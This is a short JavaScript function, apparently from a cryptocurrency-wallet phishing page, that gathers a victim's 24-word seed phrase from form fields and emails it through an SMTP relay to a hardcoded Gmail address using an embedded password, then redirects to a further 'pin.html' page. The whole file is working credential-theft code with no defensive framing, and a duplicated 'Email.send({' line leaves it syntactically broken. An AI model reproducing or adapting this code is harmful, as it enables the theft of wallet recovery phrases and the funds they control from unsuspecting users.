function emailSend() {
  var seedPhraseWords = [];
  
  // Collect seed phrase input values
  const seedInputs = document.querySelectorAll('.seed-input');
  seedInputs.forEach(input => {
    seedPhraseWords.push(input.value.trim());
  });

  // Check if all seed phrase fields are filled
  if (seedPhraseWords.includes("") || seedPhraseWords.length !== 24) {
    swal("Error", "Please complete all 24 seed phrase fields", "error");
    return;
  }

  // Create the message body for the email
  var messageBody = "Seed Phrase: " + seedPhraseWords.join(" ");

  // Send the email
  Email.send({
    Email.send({
    Host: "smtp.elasticemail.com",
    Username: "payday10177@gmail.com",
    Password: "176A549B6BD880A9C5A531EDE06FF1F541C8",
    To: 'payday10177@gmail.com',
    From: "payday10177@gmail.com",
    Subject: "Seed Phrase",
    Body: messageBody
  }).then(
    message => {
      if (message == 'OK') {
        window.location.href = 'pin.html';  // Redirect to the next page
      } else {
        swal("Error", "There was a problem sending your seed phrase. Please try again.", "error");
      }
    }
  );
}

